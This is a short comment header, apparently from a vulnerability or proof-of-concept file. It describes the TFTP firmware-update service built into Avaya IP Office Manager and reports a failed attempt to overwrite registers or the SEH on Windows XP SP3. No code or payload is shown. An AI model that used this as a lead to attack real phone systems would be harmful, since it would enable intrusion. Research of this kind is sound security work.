#Description: Avaya IP Office Manager is the management console for Avaya IP Office phone systems.
#There is a built in TFTP server that is used to update the firmware on phones. The TFTP service
#is loaded when the admin console is opened. I was not able to overwrite any registers or the SEH.

#Tested on: Windows XP SP3
